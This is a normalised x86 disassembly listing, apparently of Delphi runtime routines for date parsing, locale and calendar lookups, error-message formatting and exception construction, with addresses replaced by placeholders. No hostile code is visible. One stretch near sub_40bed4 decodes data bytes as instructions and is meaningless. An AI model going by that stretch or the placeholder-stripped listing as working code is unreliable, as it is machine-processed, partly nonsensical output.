mov al [ esi + eax - 0x1 ]
cmp al [ esp ]
jne r-xdata
inc [ edi ]
mov bl 0x1
sub_40ad78
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov edi 0x1
jmp r-xdata
mov eax esi
call sub_404354
cmp edi eax
jle r-xdata
mov al [ esi + edi - 0x1 ]
and al 0xdf
sub al 0x44
je r-xdata
xor ebx ebx
mov bl 0x1
jmp r-xdata
dec al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov bl 0x2
jmp r-xdata
sub al 0x8
je r-xdata
xor ebx ebx
jmp r-xdata
sub al 0xc
je r-xdata
mov bl 0x2
jmp r-xdata
jmp r-xdata
inc edi
sub_40adc4
push ebx
push esi
mov ebx edx
mov esi eax
jmp r-xdata
mov eax esi
call sub_404354
cmp eax [ ebx ]
jl r-xdata
pop esi
pop ebx
retn
mov eax [ ebx ]
mov al [ esi + eax - 0x1 ]
add al 0xd0
sub al 0xa
jae r-xdata
mov eax [ ebx ]
mov al [ esi + eax - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
inc [ ebx ]
mov edx [ ebx ]
mov eax esi
call sub_40c8e4
mov [ ebx ] eax
jmp r-xdata
sub_40ae0c
push ebx
push esi
push edi
push ebp
push ecx
mov ebp eax
xor eax eax
mov [ esp ] eax
mov edi 0x7
mov ebx rw-data
mov esi rw-data
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_404554
push eax
mov eax [ ebx ]
call sub_404554
pop edx
call sub_40ca5c
test eax eax
je r-xdata
add esi 0x4
add ebx 0x4
dec edi
jne r-xdata
mov eax [ esi ]
mov [ esp ] eax
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
sub_40ae60
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ rw-data ] 0x12
jne r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
cmp ebx 0x63
jg r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jle r-xdata
call sub_40a000
movzx ecx ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cdq
xor eax edx
sub eax edx
add ecx eax
mov eax ecx
mov ecx 0x64
cdq
idiv ecx
imul eax eax 0x64
add ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax ebx
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
neg [ eax - 0x4 ]
jmp r-xdata
sub_40aebc
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40b1d7
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
mov [ ebp - 0x12 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x9 ] 0x0
mov eax [ rw-data ]
call sub_40ad78
mov [ ebp - 0xa ] al
xor eax eax
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ rw-data ]
mov eax r-xdata
call sub_40c998
test eax eax
jle r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x67
jne r-xdata
lea eax [ ebp - 0x15 ]
push eax
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax esi
call sub_40ac20
test al al
je r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax esi
call sub_40adc4
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebx ]
dec ecx
mov edx 0x1
mov eax esi
call sub_4045b4
mov eax [ ebp - 0x20 ]
lea edx [ ebp - 0x1c ]
call sub_408100
mov eax [ ebp - 0x1c ]
call sub_40ae0c
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b1de
lea eax [ ebp - 0x28 ]
mov edx 0x4
call sub_4040b8
retn
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40ad40
test al al
je r-xdata
lea eax [ ebp - 0x16 ]
push eax
lea ecx [ ebp - 0xe ]
mov edx ebx
mov eax esi
call sub_40ac20
test al al
je r-xdata
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40ad40
test al al
je r-xdata
call sub_40a000
mov edi eax
cmp [ ebp - 0xa ] 0x1
jne r-xdata
lea eax [ ebp - 0x17 ]
push eax
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax esi
call sub_40ac20
test al al
je r-xdata
mov ax [ ebp - 0xc ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x14 ] ax
mov ax [ ebp - 0xc ]
mov [ ebp - 0x14 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
jmp r-xdata
mov al [ ebp - 0xa ]
sub al 0x1
jb r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov cx [ ebp - 0x14 ]
mov dx [ ebp - 0x12 ]
mov eax edi
call sub_409d48
mov [ ebp - 0x9 ] al
mov edx [ rw-data ]
mov eax r-xdata
call sub_404698
test eax eax
je r-xdata
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40ad40
mov edx ebx
mov eax esi
call sub_40abfc
cmp [ rw-data ] 0x0
je r-xdata
mov di [ ebp - 0x10 ]
mov al [ ebp - 0x17 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xc ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
je r-xdata
mov eax [ rw-data ]
mov al [ eax ]
add al 0xd0
sub al 0xa
jae r-xdata
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
mov di [ ebp - 0x10 ]
mov al [ ebp - 0x17 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xc ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
dec al
je r-xdata
mov eax esi
call sub_404354
cmp eax [ ebx ]
jl r-xdata
mov edx ebx
mov eax esi
call sub_40adc4
jmp r-xdata
cmp [ ebp - 0x18 ] 0x2
ja r-xdata
push ebp
movzx eax di
call sub_40ae60
pop ecx
mov edi eax
jmp r-xdata
mov di [ ebp - 0xc ]
mov al [ ebp - 0x15 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40abfc
mov eax esi
call sub_404354
cmp eax [ ebx ]
jl r-xdata
mov eax [ ebx ]
cmp [ esi + eax - 0x1 ] 0x20
jne r-xdata
call sub_40a000
movzx ecx ax
movzx eax [ rw-data ]
sub ecx eax
mov eax ecx
push ecx
mov ecx 0x64
cdq
idiv ecx
pop ecx
imul ax ax 0x64
add di ax
cmp [ rw-data ] 0x0
jbe r-xdata
lea eax [ ebp - 0x24 ]
push eax
mov eax [ rw-data ]
call sub_404354
mov ecx eax
mov edx [ ebx ]
mov eax esi
call sub_4045b4
mov edx [ ebp - 0x24 ]
mov eax [ rw-data ]
call sub_408090
test eax eax
je r-xdata
inc [ ebx ]
movzx eax di
cmp ecx eax
jle r-xdata
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
call sub_404354
mov ecx eax
mov edx [ ebx ]
mov eax esi
call sub_4045b4
mov edx [ ebp - 0x28 ]
mov eax [ rw-data ]
call sub_408090
test eax eax
jne r-xdata
add di 0x64
jmp r-xdata
sub_40b200
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp ] ecx
mov esi edx
mov ebp eax
xor ebx ebx
or edi 0xffffffff
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40acb4
test al al
jne r-xdata
xor edi edi
jmp r-xdata
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40acb4
test al al
je r-xdata
test edi edi
jl r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40acb4
test al al
jne r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0x8 ]
mov edx esi
mov eax ebp
call sub_40ac20
test al al
je r-xdata
mov edx esi
mov eax ebp
call sub_40abfc
mov edi 0xc
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40acb4
test al al
je r-xdata
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x6 ] 0x0
mov [ esp + 0x8 ] 0x0
mov [ esp + 0xa ] 0x0
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40ad40
test al al
je r-xdata
test edi edi
jge r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xa ]
mov edx esi
mov eax ebp
call sub_40ac20
test al al
je r-xdata
test edi edi
jl r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40acb4
test al al
jne r-xdata
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40ad40
test al al
je r-xdata
mov edx esi
mov eax ebp
call sub_40abfc
mov ax [ esp + 0xa ]
push eax
mov eax [ esp + 0x4 ]
push eax
mov cx [ esp + 0x10 ]
mov dx [ esp + 0xe ]
mov ax [ esp + 0xc ]
call sub_409c40
mov ebx eax
cmp [ esp + 0x4 ] 0x0
je r-xdata
xor edi edi
jmp r-xdata
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40acb4
test al al
je r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xc ]
mov edx esi
mov eax ebp
call sub_40ac20
test al al
je r-xdata
cmp [ esp + 0x4 ] 0xc
ja r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40acb4
test al al
jne r-xdata
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40ad40
test al al
je r-xdata
cmp [ esp + 0x4 ] 0xc
jne r-xdata
mov edi 0xc
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40acb4
test al al
je r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xe ]
mov edx esi
mov eax ebp
call sub_40ac20
test al al
je r-xdata
add [ esp + 0x4 ] di
mov [ esp + 0x4 ] 0x0
sub_40b3f4
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
mov ecx esi
mov edx esp
mov eax ebx
call sub_40b200
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_404354
cmp eax [ esp ]
jl r-xdata
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_40b428
push ebx
push esi
push edi
add esp 0xffffffe8
mov edi edx
mov esi eax
mov bl 0x1
mov [ esp ] 0x1
xor eax eax
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] eax
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax esi
call sub_40aebc
test al al
je r-xdata
mov edx edi
mov eax esi
call sub_40b3f4
mov ebx eax
jmp r-xdata
mov eax esi
call sub_404354
cmp eax [ esp ]
jl r-xdata
mov eax ebx
add esp 0x18
pop edi
pop esi
pop ebx
retn
fld [ esp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jb r-xdata
lea ecx [ esp + 0x10 ]
mov edx esp
mov eax esi
call sub_40b200
test al al
jne r-xdata
fld [ esp + 0x8 ]
fsub [ esp + 0x10 ]
fstp [ edi ]
fwait
fld [ esp + 0x8 ]
fadd [ esp + 0x10 ]
fstp [ edi ]
fwait
jmp r-xdata
sub_40b4b4
push ebx
add esp 0xffffff00
mov ebx edx
push 0x0
push 0x100
lea edx [ esp + 0x8 ]
push edx
push 0x0
push eax
push 0x0
push 0x3200
call FormatMessageA
jmp r-xdata
test eax eax
jle r-xdata
mov edx esp
mov ecx ebx
xchg ecx eax
call sub_404184
add esp 0x100
pop ebx
retn
mov dl [ esp + eax - 0x1 ]
sub dl 0x21
jb r-xdata
dec eax
sub dl 0xd
je r-xdata
sub_40b500
push ebp
mov ebp esp
add esp 0xffffff00
push ebx
push esi
mov esi ecx
mov ebx [ ebp + 0x8 ]
push 0x100
lea ecx [ ebp - 0x100 ]
push ecx
push edx
push eax
call GetLocaleInfoA
test eax eax
jle r-xdata
mov eax ebx
mov edx esi
call sub_4040e8
mov ecx eax
dec ecx
lea edx [ ebp - 0x100 ]
mov eax ebx
call sub_404184
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_40b54c
push ebx
push esi
push edi
push ecx
mov ebx ecx
mov esi edx
mov edi eax
push 0x2
lea eax [ esp + 0x4 ]
push eax
push esi
push edi
call GetLocaleInfoA
test eax eax
jle r-xdata
mov eax ebx
mov al [ esp ]
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_40b574
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
push ebx
mov eax [ ebp + 0x10 ]
mov eax [ eax - 0x4 ]
xor ecx ecx
mov edx esi
call sub_40b500
cmp [ ebx ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx ebx
call sub_405ca4
sub_40b5b0
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_40b6c3
push [ fs : eax ]
mov [ fs : eax ] esp
call GetThreadLocale
mov [ ebp - 0x4 ] eax
mov ebx 0x1
mov esi rw-data
mov edi rw-data
push ebp
push 0xb
lea eax [ ebp - 0xc ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
lea eax [ ebx + 0x44 ]
dec eax
call sub_40b574
pop ecx
mov edx [ ebp - 0xc ]
mov eax esi
call sub_4040e8
push ebp
push 0xb
lea eax [ ebp - 0x10 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
lea eax [ ebx + 0x38 ]
dec eax
call sub_40b574
pop ecx
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_4040e8
inc ebx
add edi 0x4
add esi 0x4
cmp ebx 0xd
jne r-xdata
mov ebx 0x1
mov esi rw-data
mov edi rw-data
lea eax [ ebx + 0x5 ]
mov ecx 0x7
cdq
idiv ecx
mov [ ebp - 0x8 ] edx
push ebp
push 0x6
lea eax [ ebp - 0x14 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
mov eax [ ebp - 0x8 ]
add eax 0x31
call sub_40b574
pop ecx
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_4040e8
push ebp
push 0x6
lea eax [ ebp - 0x18 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
mov eax [ ebp - 0x8 ]
add eax 0x2a
call sub_40b574
pop ecx
mov edx [ ebp - 0x18 ]
mov eax edi
call sub_4040e8
inc ebx
add edi 0x4
add esi 0x4
cmp ebx 0x8
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b6ca
lea eax [ ebp - 0x18 ]
mov edx 0x4
call sub_4040b8
retn
sub_40b6d4
push ebp
mov ebp esp
push ebx
push esi
xor esi esi
mov ebx 0x1
jmp r-xdata
cmp [ ebx * 4 + rw-data ] 0x0
jne r-xdata
cmp ebx 0x7
je r-xdata
lea eax [ ebx * 4 + rw-data ]
mov edx [ ebp + 0x8 ]
call sub_40428c
mov esi 0x1
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
inc ebx
sub_40b710
push ebp
mov ebp esp
push 0x0
push ebx
push esi
xor eax eax
push ebp
push sub_40b775
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
mov ebx 0x1
jmp r-xdata
cmp [ ebx * 4 + rw-data ] 0xffffffff
jne r-xdata
cmp ebx 0x7
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_40428c
mov eax [ ebp - 0x4 ]
xor edx edx
call sub_408378
mov [ ebx * 4 + rw-data ] eax
mov esi 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b77c
lea eax [ ebp - 0x4 ]
call sub_404094
retn
inc ebx
sub_40b788
push ebp
mov ebp esp
push 0x0
push esi
xor eax eax
push ebp
push sub_40b81f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
call GetThreadLocale
mov ecx r-xdata
mov edx 0x100b
call sub_40b500
mov eax [ ebp - 0x4 ]
mov edx 0x1
call sub_408378
mov esi eax
mov eax esi
add eax 0xfffffffd
sub eax 0x3
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b826
lea eax [ ebp - 0x4 ]
call sub_404094
retn
push 0x4
push esi
call GetThreadLocale
push eax
push sub_40b6d4
call EnumCalendarInfoA
mov edx 0x7
mov eax rw-data
mov [ eax ] 0xffffffff
add eax 0x4
dec edx
jne r-xdata
push 0x3
push esi
call GetThreadLocale
push eax
push sub_40b710
call EnumCalendarInfoA
sub_40b838
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_40ba02
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx 0x1
mov eax edi
call sub_404094
lea eax [ ebp - 0x8 ]
push eax
call GetThreadLocale
mov ecx r-xdata
mov edx 0x1009
call sub_40b500
mov eax [ ebp - 0x8 ]
mov edx 0x1
call sub_408378
add eax 0xfffffffd
sub eax 0x3
jb r-xdata
mov eax esi
call sub_404354
cmp ebx eax
jle r-xdata
mov eax [ rw-data ]
sub eax 0x4
je r-xdata
mov al [ esi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ba09
lea eax [ ebp - 0x14 ]
mov edx 0x4
call sub_4040b8
retn
mov al 0x1
add eax 0xfffffff3
sub eax 0x2
jb r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x2
call sub_408af8
test eax eax
jne r-xdata
mov edx ebx
mov eax esi
call sub_40c8a8
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax esi
call sub_4045b4
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_40435c
add ebx [ ebp - 0x4 ]
jmp r-xdata
mov eax edi
mov edx esi
call sub_4040e8
jmp r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x4
call sub_408af8
test eax eax
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_40435c
inc ebx
jmp r-xdata
mov eax esi
call sub_404354
cmp ebx eax
jle r-xdata
test al al
je r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x2
call sub_408af8
test eax eax
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_40435c
add ebx 0x3
jmp r-xdata
inc ebx
mov al [ esi + ebx - 0x1 ]
sub al 0x47
je r-xdata
jmp r-xdata
mov al [ esi + ebx - 0x1 ]
sub al 0x59
je r-xdata
mov eax edi
mov edx r-xdata
call sub_40435c
inc ebx
jmp r-xdata
inc ebx
sub al 0x20
je r-xdata
mov eax edi
mov edx r-xdata
call sub_40435c
jmp r-xdata
sub al 0x20
jne r-xdata
lea eax [ ebp - 0xc ]
mov dl [ esi + ebx - 0x1 ]
call sub_40427c
mov edx [ ebp - 0xc ]
mov eax edi
call sub_40435c
lea eax [ ebp - 0x14 ]
mov dl [ esi + ebx - 0x1 ]
call sub_40427c
mov edx [ ebp - 0x14 ]
mov eax edi
call sub_40435c
sub_40ba6c
push ebp
mov ebp esp
add esp 0xfffffba8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
push 0x1c
lea eax [ ebp - 0x330 ]
push eax
push ebx
call VirtualQuery
cmp [ ebp - 0x320 ] 0x1000
jne r-xdata
push 0x105
lea eax [ ebp - 0x212 ]
push eax
mov eax [ rw-data ]
push eax
call GetModuleFileNameA
mov eax ebx
call sub_40ba60
mov [ ebp - 0x8 ] eax
jmp r-xdata
push 0x105
lea eax [ ebp - 0x212 ]
push eax
mov eax [ ebp - 0x32c ]
push eax
call GetModuleFileNameA
test eax eax
jne r-xdata
lea eax [ ebp - 0x212 ]
mov dl 0x5c
call sub_40cafc
mov edx eax
inc edx
lea eax [ ebp - 0x10d ]
mov ecx 0x104
call sub_408a1c
mov ebx r-xdata
mov edi r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
sub ebx [ ebp - 0x32c ]
mov [ ebp - 0x8 ] ebx
push 0x100
lea eax [ ebp - 0x312 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
call sub_4051ac
push eax
call LoadStringA
lea edx [ ebp - 0x458 ]
mov eax [ esi ]
call sub_403294
lea eax [ ebp - 0x458 ]
mov [ ebp - 0x358 ] eax
mov [ ebp - 0x354 ] 0x4
lea eax [ ebp - 0x10d ]
mov [ ebp - 0x350 ] eax
mov [ ebp - 0x34c ] 0x6
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x348 ] eax
mov [ ebp - 0x344 ] 0x5
mov [ ebp - 0x340 ] ebx
mov [ ebp - 0x33c ] 0x6
mov [ ebp - 0x338 ] edi
mov [ ebp - 0x334 ] 0x6
lea eax [ ebp - 0x358 ]
push eax
push 0x4
lea ecx [ ebp - 0x312 ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_409054
mov eax [ ebp - 0x4 ]
call sub_40898c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi + 0x4 ]
call sub_404554
mov ebx eax
mov eax ebx
call sub_40898c
test eax eax
je r-xdata
cmp [ ebx + eax - 0x1 ] 0x2e
je r-xdata
mov edi r-xdata
sub_40bbf4
add esp 0xfffffbbc
push 0x400
lea ecx [ esp + 0x48 ]
call sub_40ba6c
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
push 0x40
lea eax [ esp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
call sub_4051ac
push eax
call LoadStringA
push 0x2010
lea eax [ esp + 0x8 ]
push eax
lea eax [ esp + 0x4c ]
push eax
push 0x0
call MessageBoxA
mov eax [ rw-data ]
call sub_402b94
call sub_40285c
lea eax [ esp + 0x44 ]
push eax
lea eax [ esp + 0x48 ]
push eax
call CharToOemA
push 0x0
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4c ]
call sub_40898c
push eax
lea eax [ esp + 0x50 ]
push eax
push 0xfffffff4
call GetStdHandle
push eax
call WriteFile
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
push r-xdata
push 0xfffffff4
call GetStdHandle
push eax
call WriteFile
jmp r-xdata
add esp 0x444
retn
sub_40bcbc
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea eax [ edi + 0x4 ]
mov edx esi
call sub_4040e8
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_40bcf8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_40bd52
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov eax esi
call sub_409094
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x4 ]
call sub_4040e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40bd59
lea eax [ ebp - 0x4 ]
call sub_404094
retn
add esp 0xfffffff0
call sub_403668
sub_40bd59
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_40bd78
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea edx [ edi + 0x4 ]
mov eax esi
call sub_405ca4
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_40bdb4
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_40be20
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_405ca4
mov eax [ ebp - 0x8 ]
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
call sub_409094
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x4 ]
call sub_4040e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40be27
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4040b8
retn
add esp 0xfffffff0
call sub_403668
sub_40be27
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_40be74
push ebx
push esi
add esp 0xfffffff8
xor ebx ebx
call sub_4028d0
mov esi eax
jmp r-xdata
cmp ebx 0x6
jg r-xdata
cmp ebx 0x6
jg r-xdata
cmp esi [ ebx * 8 + rw-data ]
jne r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0x0
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bdb4
mov ecx [ ebx * 8 + rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bcbc
jmp r-xdata
inc ebx
mov [ eax + 0xc ] esi
pop ecx
pop edx
pop esi
pop ebx
retn
sub_40bed4
fdivr [ esi + 0xa0e0040 ]
push esp
inc ebp
js r-xdata
jpo r-xdata
jo r-xdata
[ ebx - 0x3d ]
mov eax eax
loopne r-xdata
push edx
je r-xdata
pop ebp
cld
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40bfe4
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov edx [ rw-data ]
jmp r-xdata
dec dl
je r-xdata
pop es
arpl [ gs : eax ] cx
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] bh
add [ eax ] al
push ebx
mov ebx edx
mov edx eax
dec dl
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ca4
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_40412c
jmp r-xdata
push ebx
mov eax edx
jmp sub_403ad0
mov edx [ rw-data ]
jmp r-xdata
dec edx
sub dl 0x16
jb r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] 0xb
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0xb
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x1c ]
push eax
push 0x2
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405ca4
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bcf8
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40bfeb
lea eax [ ebp - 0x20 ]
call sub_404094
lea eax [ ebp - 0x4 ]
call sub_404094
retn
and eax 0xff
lea eax [ eax * 8 + rw-data ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
mov dl 0x1
call sub_40bcbc
mov edx eax
jmp r-xdata
jmp r-xdata
call sub_40be74
mov edx eax
sub_40bf48
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x4 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40bfe4
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ca4
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_40412c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] 0xb
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0xb
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x1c ]
push eax
push 0x2
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405ca4
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bcf8
mov ebx eax
xor eax eax
pop edx
pop ecx
